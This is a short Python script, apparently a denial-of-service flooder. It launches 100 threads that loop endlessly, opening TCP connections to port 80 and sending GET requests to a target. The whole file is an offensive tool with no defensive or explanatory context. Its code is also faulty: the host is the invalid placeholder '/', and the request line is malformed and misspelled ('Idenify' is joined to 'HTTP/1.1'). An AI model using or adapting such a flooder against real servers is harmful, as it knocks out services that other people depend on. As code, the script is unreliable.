import socket
from threading import Thread

host = "/"
ip = host
port = 80

def dos():
    while True:
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        try:
            mysocket.connect((ip, port))
            mysocket.send(str.encode("GET " + "Idenify" + "HTTP/1.1 \r\n"))
            mysocket.sendto(str.encode("GET " + "Idenify" + "HTTP/1.1 \r\n"), (ip, port) )
        except socket.error:
            print("error")
        mysocket.close()

for i in range(100):
    t = Thread(target=dos)
    t.start() 



